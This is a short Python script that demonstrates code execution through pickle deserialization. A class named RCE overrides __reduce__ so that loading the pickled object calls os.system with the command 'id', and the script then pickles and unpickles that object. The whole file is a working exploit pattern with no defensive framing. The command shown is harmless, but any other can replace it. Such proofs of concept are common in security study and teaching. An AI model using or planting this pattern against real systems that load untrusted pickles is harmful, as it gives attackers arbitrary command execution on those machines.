import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickled = pickle.dumps(RCE())
pickle.loads(pickled)
